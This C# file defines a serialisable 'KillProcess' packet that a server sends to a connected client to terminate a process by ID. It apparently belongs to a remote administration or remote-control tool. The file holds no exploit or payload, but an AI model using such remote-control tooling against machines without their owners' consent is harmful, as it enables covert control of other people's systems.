using ProtoBuf;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class KillProcess : IPacket
    {
        public KillProcess()
        {
        }

        public KillProcess(int pid)
        {
            PID = pid;
        }

        [ProtoMember(1)]
        public int PID { get; set; }

        public void Execute(Client client)
        {
            client.Send<KillProcess>(this);
        }
    }
}